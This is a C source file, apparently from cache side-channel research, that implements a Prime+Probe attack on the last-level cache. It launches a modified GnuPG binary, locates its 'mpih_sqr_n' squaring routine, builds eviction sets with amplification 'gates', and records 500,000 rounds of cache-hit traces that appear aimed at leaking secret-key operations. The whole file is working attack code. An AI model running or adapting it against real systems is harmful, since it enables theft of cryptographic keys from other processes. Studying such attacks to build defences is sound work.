#include <stdint.h>
#include <string.h>
#include <assert.h>
#include <stdio.h>
#include <unistd.h>

#include "ev/ev.h"
#include "measure/measure.h"
#include "gates/gates.h"
#include "gates/bt_gates.h"
#include "gates/nbt_gates.h"
#include "retention/retention.h"
#include "amplification/tree_amplification.h"
#include "consts.h"
#include "util.h"


int get_measurements_index(int sample_index, int double_cache_line_to_skip);
int get_result_offset(int index, int start_double_cache_line, int end_double_cache_line);
uintptr_t prime_probe_loop(eviction_set llc_eviction_set, char *measurements, retention_scheme *scheme, uintptr_t trash, bool use_tree_amplification);

amplification_metadata * const prime_probe_amplification = &tree_amplification_100us;
const measure_metadata * const prime_probe_conforming_measure = &tree_amplification_100us_measure_metadata;
// amplification_metadata * const prime_probe_amplification = &tree_amplification_1ms;
// const measure_metadata * const prime_probe_conforming_measure = &tree_amplification_1ms_measure_metadata;

int prime_probe_gnupg(int argc, char *argv[]) {
    uintptr_t trash = 0;
    eviction_set llc_eviction_set = {0};
    
    initialize_clear_cache_allocation();
    trash = prime_probe_amplification->initialize(prime_probe_amplification, trash);
    if (!prime_probe_amplification->verify(prime_probe_amplification))
        return 0;

    uintptr_t target = mmap_symbol_from_binary("/home/acrypto/Documents/bad_gpg/gpg_random_457_looping", "mpih_sqr_n");
    target = ((target + DOUBLE_CACHE_LINE_SIZE - 1) / DOUBLE_CACHE_LINE_SIZE) * DOUBLE_CACHE_LINE_SIZE;

    assert(populate_eviction_set(&llc_eviction_set, target));

    eviction_set *eviction_sets = find_eviction_sets(100);
    assert(eviction_sets != NULL);

    // chosen based on graph performance.
    retention_metadata __attribute__ ((aligned (PAGE_SIZE))) metadata = {.allowed_double_cache_lines={0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}, .pages=399, .per_ev=4, .shrink_factor=3, .interleave=3};
    retention_scheme __attribute__ ((aligned (PAGE_SIZE))) scheme = initialize_retention_scheme(metadata, eviction_sets);

    int number_of_samples = total_retention_entries(metadata);

    FILE *proc = popen("/home/acrypto/Documents/bad_gpg/gpg_random_457_looping -p 1>/dev/null", "w");    
    // Let it load...
    sleep(1);

    int required_measurement_storage = get_measurements_index(number_of_samples - 1, llc_eviction_set.eviction_set_page_offset);
    required_measurement_storage = ((required_measurement_storage + PAGE_SIZE - 1) / PAGE_SIZE) * PAGE_SIZE;

    // TODO: consider skipping the double cache lines used in the storage.
    char *measurements = 0;
    initialize_allocation((void **)&measurements, required_measurement_storage);

    for (int i = 0; i < 500000; i++) {
        trash = clear_all_caches(trash);
        trash = prime_probe_loop(llc_eviction_set, measurements, &scheme, trash, true);

        // printf("At %d: \n", i);
        for (int i = 1; i < total_measure_entries(metadata); i++) {
            printf("%01x", measurements[get_measurements_index(i, llc_eviction_set.eviction_set_page_offset)]);
        }
        printf("\n");
    }
    system("kill -9 `pidof gpg_random_457_looping`");

    return (trash == 0xbaaaad);
}


int get_measurements_index(int sample_index, int double_cache_line_to_skip) {
    int result = sample_index / (PAGE_SIZE - DOUBLE_CACHE_LINE_SIZE) * PAGE_SIZE;
    int last_page_offset = sample_index % (PAGE_SIZE - DOUBLE_CACHE_LINE_SIZE);
    if (last_page_offset >= double_cache_line_to_skip)
        last_page_offset += DOUBLE_CACHE_LINE_SIZE;
    
    return result + last_page_offset;
}


uintptr_t nand_12to2_impl(gate_bank *bank, uintptr_t trash) {
    return apply_gate(&nbt_nand_12to2_metadata, bank, trash);
}

uintptr_t prime_probe_loop(eviction_set llc_eviction_set, char *measurements, retention_scheme *scheme, uintptr_t trash, bool use_tree_amplification) {
    static gate_bank __attribute__ ((aligned (PAGE_SIZE))) bank = {0};
    const int samples = total_retention_entries(scheme->metadata);
    const int total_measurements = total_measure_entries(scheme->metadata);

    bank.input_base = (uintptr_t)eviction_set_memory;
    bank.output_base = (uintptr_t)eviction_set_memory;

    for (int i = 0; i < llc_eviction_set.length; i++) {
        bank.input_offsets[i] = (uint32_t)((uintptr_t)(llc_eviction_set.arr[i]) - (uintptr_t)eviction_set_memory);
    }

    bank.output_offsets[0] = retention_get_entry(scheme, 0) - (uintptr_t)eviction_set_memory;
    bank.output_offsets[1] = retention_get_entry(scheme, 0) - (uintptr_t)eviction_set_memory + PAGE_SIZE / 2;

    // We store results in double cache lines slots 1..7, we don't want to risk intersection of storage with the ev.
    assert(llc_eviction_set.eviction_set_page_offset / DOUBLE_CACHE_LINE_SIZE > 7);

    // Throwaway first iteration
    trash = nand_12to2_impl(&bank, trash);

    for (int i = 1; i < samples; i++) {
        bank.output_offsets[0] = retention_get_entry(scheme, i) - (uintptr_t)eviction_set_memory;
        bank.output_offsets[1] = retention_get_entry(scheme, i) - (uintptr_t)eviction_set_memory + PAGE_SIZE / 2;
        trash = nand_12to2_impl(&bank, trash);
        trash = FORCE_READ(bank.output_base + bank.output_offsets[1], trash);
        #pragma GCC unroll 400
        for (int j = 0; j < 200; j++) {
            trash ^= 1; trash++;
        }
    }

    for (int i = 1; i < total_measurements; i++) {
        measure_metadata metadata = rdtsc_measure_metadata;
        if (use_tree_amplification)
            metadata = *prime_probe_conforming_measure;

        uint64_t result = retention_measure(scheme, i, &metadata, trash);
        trash += result;
        measurements[get_measurements_index(i, llc_eviction_set.eviction_set_page_offset)] = !metadata.is_in_cache(result);
    }

    return trash;
}